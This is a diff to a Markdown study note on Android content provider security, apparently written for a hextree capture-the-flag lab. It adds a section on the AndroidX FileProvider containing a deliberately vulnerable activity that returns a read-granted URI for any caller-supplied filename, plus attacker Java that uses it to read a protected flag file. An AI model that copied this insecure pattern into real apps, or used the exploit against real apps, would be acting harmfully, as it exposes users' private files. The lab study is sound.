@@ -1,8 +1,9 @@
-# Content Provider
+# Content & File Provider
 - [Overview](#overview)
 - [SQL Injection in Content Providers](#sql-injection-in-content-providers)
 - [GRANT_READ_URI_PERMISSION](#grant_read_uri_permission)
 - [Hijacking Content Provider Access](#hijacking-content-provider-access)
+- [The AndroidX FileProvider](#the-androidx-fileprovider)
 
 
 ## Overview
@@ -178,6 +179,88 @@ dump(intent.getData());
         }
     }
 ```
+## The AndroidX FileProvider
+- Android Jetpack (or androidx) is a commonly used official library implementing lots of useful classes. Including the widely used FileProvider.
+- Such a provider can easily be identified in the Android manifest where it references the androidx.core.content.FileProvider name.
+```xml
+<provider android:name="androidx.core.content.FileProvider"
+          android:exported="false" 
+          android:authorities="io.hextree.files"
+          android:grantUriPermissions="true">
+    <meta-data android:name="android.support.FILE_PROVIDER_PATHS" 
+               android:resource="@xml/filepaths"/>
+</provider>
+```
 
+- Notable is the referenced XML file filepaths.xml which contains the configuration for this FileProvider.
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<paths>
+    <files-path name="flag_files" path="flags/"/>
+    <files-path name="other_files" path="."/>
+</paths>
+```
+
+- A typical URI generated for this FileProvider could look like this content://io.hextree.files/other_files/secret.txt. Where the sections can be read like so:
+
+    - `content://` it's a content provider
+    - `io.hextree.files` the authority from the android manifest
+    - `other_files` which configuration entry is used
+    - `/secret.txt` the path of the file relative to the configured path in the .xml file
+
+- Example: How To Access FileProvider
+```java
+// Vulnerable Class
+    public void onCreate(Bundle bundle) {
+        super.onCreate(bundle);
+        String stringExtra = getIntent().getStringExtra("filename");
+        if (stringExtra != null) {
+            prepareFlag(this, stringExtra);
+            Uri uriForFile = FileProvider.getUriForFile(this, "io.hextree.files", new File(getFilesDir(), stringExtra));
+            Intent intent = new Intent();
+            intent.setData(uriForFile);
+            intent.addFlags(3);
+            setResult(0, intent);
+            return;
+        }
+        Uri uriForFile2 = FileProvider.getUriForFile(this, "io.hextree.files", new File(getFilesDir(), "secret.txt"));
+        Intent intent2 = new Intent();
+        intent2.setData(uriForFile2);
+        intent2.addFlags(3);
+        setResult(-1, intent2);
+    }
+
+```
+- Read the flag:
+```java
+ Button button = findViewById(R.id.click);
+        button.setOnClickListener(v -> {
+            Intent intent = new Intent();
+            intent.putExtra("filename", "flags/flag34.txt");
+            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag34Activity");
+            startActivityForResult(intent, 42);
+        });
+
+    
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == 42) { // Matching the requestCode
+            try {
+                InputStream inputStream = getContentResolver().openInputStream(data.getData());
+                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
+                String line;
+
+                while ((line = reader.readLine()) != null) {
+                    Log.d("File", line);
+                }
+            }
+            catch (IOException e){
+            }            
+            
+        }
+    }
+```
 ## Resources
 - [Oversecured Content Provider](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers)
